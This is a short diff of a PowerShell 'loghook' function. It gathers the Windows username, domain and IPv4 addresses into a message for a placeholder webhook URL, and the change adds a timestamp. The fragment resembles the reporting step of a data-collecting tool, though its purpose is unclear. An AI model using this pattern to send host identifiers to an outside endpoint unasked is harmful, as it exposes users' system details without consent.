@@ -10,7 +10,8 @@ function loghook {
     # Define the webhook URL
     $webhookUrl = "YOUR_WEBHOOK_HERE2"
     $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress
-    $Messagee = "$env:USERNAME - $env:USERDOMAIN `n tin nhan: ``````$Message``````"
+    $currentDateTime = Get-Date
+    $Messagee = "$env:USERNAME - $env:USERDOMAIN `n $currentDateTime `n tin nhan: ``````$Message``````"
     
     # Create the payload
     $payload = @{
